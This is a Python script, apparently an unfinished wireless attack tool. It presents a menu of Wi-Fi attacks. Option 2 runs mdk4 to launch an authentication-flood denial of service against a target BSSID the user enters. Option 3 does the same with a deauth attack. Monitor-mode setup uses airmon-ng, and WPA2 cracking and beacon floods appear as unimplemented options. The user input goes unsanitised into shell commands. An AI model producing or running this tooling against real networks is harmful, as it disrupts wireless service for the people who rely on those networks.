#!/usr/bin/env python

import time,sys,subprocess,os
from scapy.all import Dot11, Dot11Deauth, Dot11Disas, RadioTap, Dot11Elt, sendp, sniff, conf, EAPOL, Dot11EltRSN

def main():
	while True:
		Prompt_User()

def Prompt_User():
	opt = 99
	while not (1 <= opt <= 6):
		opt = Get_Input()
	if opt == 1:
		pass
	if opt == 2:
		bssid = input('Enter BSSID of Target: ')
		print(f"Started attack on {bssid}")
		subprocess.run(f"mdk4 wlan0 a -a {bssid} > /dev/null &", shell=True, executable="/bin/bash")
		exit = input('Input anything to end attack: ')
		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
		print(f"Ended attack on {bssid}")
		time.sleep(2)
	if opt == 3:
		#Not Currently Working
		bssid = input('Enter BSSID of Target: ')
		subprocess.run(f"mdk4 wlan0 d -B {bssid} > /dev/null &", shell=True, executable="/bin/bash")
		exit = input('Input anything to end attack: ')
		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
		print(f"Ended attack on {bssid}")
		time.sleep(2)
	if opt == 4:
		print(opt)
		#subprocess.run("clear", shell=True, executable="/bin/bash")
	if opt == 5:
		print(opt)
		#subprocess.run("clear", shell=True, executable="/bin/bash")
	if opt == 6:
		Exit_Script()

def Exit_Script():
	print("Ending Script")
	subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
	print("Goodbye")
	sys.exit()

def Set_Monitor():
	subprocess.run("sudo airmon-ng check kill > /dev/null", shell=True, executable="/bin/bash")
	subprocess.run("sudo airmon-ng start wlan0 > /dev/null", shell=True, executable="/bin/bash")

def Set_Managed():
	subprocess.run("systemctl start NetworkManager", shell=True, executable="/bin/bash")

def Set_Channel(channel):
	change_channel="sudo iwconfig wlan0 channel "+channel
	subprocess.run(change_channel, shell=True, executable="/bin/bash")

def Print_Options():
	options ="""
1. WPA2 cracking attack
2. DoS w/ authentication flood
3. DoS w/ deauth attack
4. DoS w/ beacon flood (2.4GHz band)
5. DoS w/ beacon flood (single channel)
6. Quit"""
	subprocess.run("clear", shell=True, executable="/bin/bash")
	print(options)
	option = input('Enter Selection: ')
	return(option)

def Get_Input():
	input = Print_Options()
	try:
		input = int(input)
	except:
		input = int(99)
	return input



if __name__ == '__main__':
    main()
